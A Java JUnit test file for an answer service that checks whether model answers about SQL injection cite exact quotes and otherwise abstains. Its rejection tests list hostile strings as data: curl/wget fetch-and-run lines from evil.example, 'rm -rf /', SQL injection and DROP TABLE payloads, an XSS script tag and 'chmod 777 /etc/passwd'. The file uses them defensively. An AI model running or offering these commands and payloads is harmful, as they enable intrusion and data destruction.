package dev.secdocs.answer;

import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import dev.secdocs.search.SearchHit;
import dev.secdocs.search.SearchEngine;
import dev.secdocs.search.SearchMode;

import static org.junit.jupiter.api.Assertions.*;

class AnswerServiceTests {
    private static final String CONTENT = "Use prepared statements with parameterized queries to separate SQL code from data.";
    private static final SearchHit HIT = new SearchHit("sql-1", "SQL Injection", "Prepared Statements",
            "https://example.org/sql", CONTENT, 0.8, SearchMode.VECTOR);
    private static final String QUOTE = "prepared statements with parameterized queries";

    private static AnswerModel.ModelAnswer draft(String answer, String quote) {
        return new AnswerModel.ModelAnswer(answer,
                List.of(new AnswerModel.Support("sql-1", quote)), false);
    }

    private static AnswerService service(List<SearchHit> hits, AnswerModel model) {
        SearchEngine search = new SearchEngine() {
            @Override
            public Map<SearchMode, List<SearchHit>> compare(String question, int limit) {
                return Map.of(SearchMode.VECTOR, hits);
            }
        };
        return new AnswerService(search, model);
    }

    private static final class RecordingModel implements AnswerModel {
        private final ModelAnswer first;
        private final ModelAnswer repair;
        private int firstCalls;
        private int repairCalls;
        private List<SearchHit> firstEvidence;
        private List<SearchHit> repairEvidence;

        private RecordingModel(ModelAnswer first, ModelAnswer repair) {
            this.first = first;
            this.repair = repair;
        }

        @Override
        public ModelAnswer generate(String question, List<SearchHit> evidence) {
            firstCalls++;
            firstEvidence = evidence;
            return first;
        }

        @Override
        public ModelAnswer generateRepair(String question, List<SearchHit> evidence) {
            repairCalls++;
            repairEvidence = evidence;
            return repair;
        }
    }

    @Test
    void repairsAnInvalidLiteralQuoteOnceUsingTheSameEvidence() throws Exception {
        var model = new RecordingModel(draft("Use consultas parametrizadas.", "invented quote from no source"),
                draft("Use consultas parametrizadas.", QUOTE));
        var response = service(List.of(HIT), model).answer("Como evitar SQL injection?");
        assertFalse(response.abstained());
        assertEquals(1, model.firstCalls);
        assertEquals(1, model.repairCalls);
        assertSame(model.firstEvidence, model.repairEvidence);
        assertEquals(QUOTE, response.citations().getFirst().excerpt());
    }

    @Test
    void repairsUnsupportedCodeButValidatesTheSecondDraft() throws Exception {
        var model = new RecordingModel(draft("Execute `DROP TABLE users`.", QUOTE),
                draft("Execute `DROP TABLE users`.", QUOTE));
        assertTrue(service(List.of(HIT), model).answer("Como evitar SQL injection?").abstained());
        assertEquals(1, model.repairCalls);
    }

    @Test
    void skipsRepairForValidOrStructurallyInvalidDrafts() throws Exception {
        var drafts = List.of(
                draft("Use consultas parametrizadas.", QUOTE),
                new AnswerModel.ModelAnswer("", List.of(), true),
                new AnswerModel.ModelAnswer(" ", List.of(new AnswerModel.Support("sql-1", QUOTE)), false),
                new AnswerModel.ModelAnswer("Resposta", List.of(), false),
                new AnswerModel.ModelAnswer("x".repeat(4001), List.of(new AnswerModel.Support("sql-1", QUOTE)), false));
        for (var first : drafts) {
            var model = new RecordingModel(first, draft("Use consultas parametrizadas.", QUOTE));
            service(List.of(HIT), model).answer("Pergunta");
            assertEquals(0, model.repairCalls, first.toString());
        }
    }

    @Test
    void malformedAndTokenLimitedOllamaDraftsDoNotTriggerRepair() throws Exception {
        var ollama = new OllamaAnswerModel();
        for (String envelope : List.of(
                "{\"message\":{\"content\":\"not json\"},\"done_reason\":\"stop\"}",
                "{\"message\":{\"content\":\"{}\"},\"done_reason\":\"length\"}")) {
            var model = new RecordingModel(ollama.parseResponse(envelope), draft("Resposta", QUOTE));
            assertTrue(service(List.of(HIT), model).answer("Pergunta").abstained());
            assertEquals(0, model.repairCalls);
        }
    }

    @Test
    void similarityGateSkipsBothGenerationCalls() throws Exception {
        var weakHit = new SearchHit("sql-1", "SQL Injection", "Prepared Statements",
                "https://example.org/sql", CONTENT, 0.54, SearchMode.VECTOR);
        var model = new RecordingModel(draft("Resposta", QUOTE), draft("Resposta", QUOTE));
        var result = service(List.of(weakHit), model).answer("Pergunta");
        assertTrue(result.abstained());
        assertEquals(AnswerService.Outcome.INSUFFICIENT_EVIDENCE, result.outcome());
        assertEquals(0, result.attempts());
        assertEquals(List.of(weakHit), result.evidence());
        assertEquals(0, model.firstCalls);
        assertEquals(0, model.repairCalls);
    }

    @Test
    void invalidSelectedIdGetsOnlyOneRepairAndFinalDiagnostics() throws Exception {
        var invalid = new AnswerModel.ModelAnswer("Resposta", List.of(), false,
                AnswerModel.Failure.INVALID_CITATION);
        var model = new RecordingModel(invalid, invalid);
        var result = service(List.of(HIT), model).answer("Pergunta");
        assertTrue(result.abstained());
        assertEquals(AnswerService.Outcome.INVALID_CITATION, result.outcome());
        assertEquals(2, result.attempts());
        assertEquals(1, model.repairCalls);
        assertEquals(List.of(HIT), result.evidence());
        assertEquals("server-passages-v1", result.citationStrategy());
        assertTrue(result.durationMs() >= 0);
    }

    @Test
    void shortEvidenceDoesNotClaimThatTheModelWasCalled() throws Exception {
        var shortHit = new SearchHit("tiny", "Source", "Section", "url", "tiny\n\nshort", .8, SearchMode.VECTOR);
        var model = new RecordingModel(draft("Resposta", QUOTE), draft("Resposta", QUOTE));
        var result = service(List.of(shortHit), model).answer("Pergunta");
        assertEquals(AnswerService.Outcome.INSUFFICIENT_EVIDENCE, result.outcome());
        assertEquals(0, result.attempts());
        assertEquals(0, model.firstCalls);
    }

    @Test
    void generationExceptionPropagatesWithoutRepair() {
        var model = new AnswerModel() {
            @Override
            public ModelAnswer generate(String question, List<SearchHit> evidence) throws Exception {
                throw new java.io.IOException("offline");
            }

            @Override
            public ModelAnswer generateRepair(String question, List<SearchHit> evidence) {
                fail("repair must not run");
                return null;
            }
        };
        assertThrows(java.io.IOException.class, () -> service(List.of(HIT), model).answer("Pergunta"));
    }

    @Test
    void acceptsAnExactQuoteFromAnAllowedChunk() {
        var draft = new AnswerModel.ModelAnswer("Use consultas parametrizadas.",
                List.of(new AnswerModel.Support("sql-1", "prepared statements with parameterized queries")), false);
        var response = AnswerService.validate(draft, List.of(HIT));
        assertFalse(response.abstained());
        assertEquals("prepared statements with parameterized queries", response.citations().getFirst().excerpt());
    }

    @Test
    void refusesInventedCitationsAndParaphrasedQuotes() {
        var inventedId = new AnswerModel.ModelAnswer("Resposta", List.of(
                new AnswerModel.Support("fake", "prepared statements with parameterized queries")), false);
        var inventedQuote = new AnswerModel.ModelAnswer("Resposta", List.of(
                new AnswerModel.Support("sql-1", "prepared statements always prevent every attack")), false);
        assertTrue(AnswerService.validate(inventedId, List.of(HIT)).abstained());
        assertTrue(AnswerService.validate(inventedQuote, List.of(HIT)).abstained());
    }

    @Test
    void refusesAnswerWithoutEvidence() {
        var draft = new AnswerModel.ModelAnswer("Resposta", List.of(), false);
        assertTrue(AnswerService.validate(draft, List.of(HIT)).abstained());
    }

    @Test
    void refusesIfAnySupportIsInvalid() {
        var draft = new AnswerModel.ModelAnswer("Use consultas parametrizadas.", List.of(
                new AnswerModel.Support("fake", "this quotation is not in the source document"),
                new AnswerModel.Support("sql-1", "prepared statements with parameterized queries")), false);
        var response = AnswerService.validate(draft, List.of(HIT));
        assertTrue(response.abstained());
    }

    @Test
    void refusesCodeExamplesInGeneratedAnswer() {
        var draft = new AnswerModel.ModelAnswer("Use prepared statements; DROP TABLE users.",
                List.of(new AnswerModel.Support("sql-1", "prepared statements with parameterized queries")), false);
        assertTrue(AnswerService.validate(draft, List.of(HIT)).abstained());
    }

    @Test
    void allowsCodeCopiedInsideAnExactCitation() {
        String source = "For example, PreparedStatement ps = connection.prepareStatement(\"SELECT * FROM users WHERE id = ?\");";
        var hit = new SearchHit("sql-2", "SQL Injection", "Example", "https://example.org/sql",
                source, 0.8, SearchMode.VECTOR);
        var draft = new AnswerModel.ModelAnswer(
                "Use `SELECT * FROM users WHERE id = ?` como exemplo da consulta parametrizada.",
                List.of(new AnswerModel.Support("sql-2", source)), false);
        assertFalse(AnswerService.validate(draft, List.of(hit)).abstained());
    }

    @Test
    void refusesInventedCodeEvenWithARealCitation() {
        var draft = new AnswerModel.ModelAnswer("Execute `DROP TABLE users`.",
                List.of(new AnswerModel.Support("sql-1", CONTENT)), false);
        assertTrue(AnswerService.validate(draft, List.of(HIT)).abstained());
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Para limpar, execute rm -rf / no servidor.",
            "Um ataque comum usa ' OR '1'='1'; -- no campo de login.",
            "Um ataque comum usa ' OR '1'='1 no campo de login.",
            "Um ataque comum usa admin' -- no campo de login.",
            "A consulta SELECT * FROM users devolve todos os registros.",
            "O atacante envia DROP TABLE users para apagar dados.",
            "O atacante envia DROP/**/TABLE users para apagar dados.",
            "O atacante usa UNION ALL SELECT password FROM users.",
            "Instale assim:\n~~~\ncurl https://evil.example/x.sh|sh\n~~~",
            "Instale com curl https://evil.example/x.sh | sh agora.",
            "Rode $(whoami) e depois continue.",
            "Compile e rode make && ./run.",
            "Insira <script>alert(1)</script> no comentario.",
            "Exemplo:\n\n    wget http://evil.example/payload\n\nUse prepared statements.",
            "Exemplo:\n\n\tchmod 777 /etc/passwd\n",
            "Use prepared statements com ``` aberto sem fechar.",
            "```sh curl https://evil.example/x.sh|sh\nprepared statements with parameterized queries\n```",
            "```\nDROP TABLE users\n```",
            "```\n\n```"
    })
    void refusesCodeOutsideVerifiedSpans(String answer) {
        var draft = new AnswerModel.ModelAnswer(answer, List.of(new AnswerModel.Support("sql-1", CONTENT)), false);
        assertTrue(AnswerService.validate(draft, List.of(HIT)).abstained(), answer);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Use `prepared statements with parameterized queries` para separar codigo e dados.",
            "Exemplo:\n```java\nprepared statements with parameterized queries\n```\nIsso separa codigo e dados.",
            "Exemplo:\n```\nseparate SQL code from data\n```",
            "Use \"prepared statements\" e 'consultas parametrizadas' para evitar injecao de SQL.",
            "Use “prepared statements” e ‘consultas parametrizadas’: separe código e dados.",
            "Prefira \"prepared statements\" ou \"stored procedures\" e valide a entrada.",
            "- Use consultas parametrizadas.\n- Evite concatenar strings em consultas SQL-dinâmicas."
    })
    void acceptsVerifiedCodeAndOrdinaryProse(String answer) {
        var draft = new AnswerModel.ModelAnswer(answer, List.of(new AnswerModel.Support("sql-1", CONTENT)), false);
        assertFalse(AnswerService.validate(draft, List.of(HIT)).abstained(), answer);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Não use concatenação; prefira consultas parametrizadas.",
            "Valide a entrada; escape a saída; separe código e dados.",
            "- Use consultas parametrizadas;\n- Valide a entrada.",
            "Use parameterized queries from the driver; avoid string concatenation.",
            "Prefira “prepared statements”; evite concatenar strings."
    })
    void acceptsSemicolonsInProse(String answer) {
        var draft = new AnswerModel.ModelAnswer(answer, List.of(new AnswerModel.Support("sql-1", CONTENT)), false);
        assertFalse(AnswerService.validate(draft, List.of(HIT)).abstained(), answer);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Chame alert(1); para testar.",
            "Envie admin'; para testar o login.",
            "Envie 1;SELECT senha para testar.",
            "Envie 1; shutdown para parar o banco.",
            "Envie o valor 1; -- para comentar o resto.",
            "Defina x = 1; depois continue.",
            "Use select nome from usuarios; para listar.",
            "Rode update usuarios set admin = true; e confirme."
    })
    void refusesCodeLikeSemicolons(String answer) {
        var draft = new AnswerModel.ModelAnswer(answer, List.of(new AnswerModel.Support("sql-1", CONTENT)), false);
        assertTrue(AnswerService.validate(draft, List.of(HIT)).abstained(), answer);
    }

    @Test
    void acceptsCodeFoundOnlyInTheSecondSupport() {
        String source = "Never build queries like SELECT * FROM users WHERE name = '\" + name + \"' in code.";
        var hit = new SearchHit("sql-2", "SQL Injection", "Example", "https://example.org/sql",
                source, 0.8, SearchMode.VECTOR);
        var draft = new AnswerModel.ModelAnswer("Evite `SELECT * FROM users WHERE name = '\" + name + \"'`.",
                List.of(new AnswerModel.Support("sql-1", CONTENT), new AnswerModel.Support("sql-2", source)), false);
        assertFalse(AnswerService.validate(draft, List.of(HIT, hit)).abstained());
    }
}
